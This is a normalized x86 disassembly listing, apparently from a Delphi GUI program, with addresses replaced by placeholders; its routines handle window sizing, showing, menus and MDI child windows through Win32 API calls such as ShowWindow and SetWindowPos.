mov eax ebx
call sub_446450
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_440258
pop esi
pop ebx
retn
sub_45bd68
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_446450
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_4456a4
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_446450
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_4537a0
sub_45bdc8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_4446bc
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_4531b4
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_45be14
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_453a14
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_45be4c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_45bee7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45beee
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_453114
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_460c08
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_43ccc0
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_460c08
jmp r-xdata
sub_45bf14
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_403368
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_45bf54
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40cefc
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_45bf80
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_45b740
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_43ca98
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_45bfd8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_445588
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45f5bc
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_403368
sub_45c064
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_446450
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_446450
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_446450
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45c0fc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_446450
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_45b6dc
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_403368
sub_45c154
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_446984
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_45c180
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_45b740
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_45c19c
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_453144
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_453144
sub_45c1dc
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_45c214
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_403f94
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_45c248
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45c399
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c3a0
lea eax [ ebp - 0x10 ]
call sub_403f40
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_45c19c
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_43ca3c
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_416a38
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_43f6c8
lea eax [ ebp - 0x1c ]
call sub_406cec
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_45c19c
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_45c1dc
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4608ac
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_460914
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_460914
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_45c214
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_416a38
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_43f6c8
lea eax [ ebp - 0x1c ]
call sub_406cec
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_460844
test [ esi + 0x228 ] 0x8
je r-xdata
sub_45c3a8
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_45c41c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_45c448
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_444968
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45a458
lea edx [ ebp - 0x14 ]
call sub_45dc20
push ebp
mov eax [ ebp - 0x4 ]
call sub_45a458
lea edx [ ebp - 0x24 ]
call sub_45dc20
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_45c41c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_45a458
lea edx [ ebp - 0x24 ]
call sub_45dc20
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_45c41c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_45c41c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_45c41c
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_45c500
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403368
pop esi
pop ebx
retn
sub_45c524
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_403368
pop esi
pop ebx
retn
sub_45c548
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_4458cc
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_446984
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_446984
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_45c5e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45cb4e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_460cf8
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_45cb31
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cb38
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
xor eax eax
push ebp
push sub_45ca38
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_403368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_45c69c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45b790
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_443924
jmp r-xdata
mov eax [ rw-data ]
call sub_45de7c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43f5b4
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_446450
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_45de70
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43f5f8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_446450
call sub_4572fc
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_45deac
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43f5b4
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_45de7c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_43fe10
push 0x0
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_45dea0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43f5f8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_45de70
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_45aa40
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_45aa40
jmp r-xdata
sub_45c6a1
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46040c
call sub_403974
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_45de7c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43f5b4
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_45de70
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43f5f8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_45deac
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43f5b4
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_45de7c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cb38
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_43fe10
push 0x0
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_45dea0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43f5f8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_45de70
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_45aa40
jmp r-xdata
push 0x0
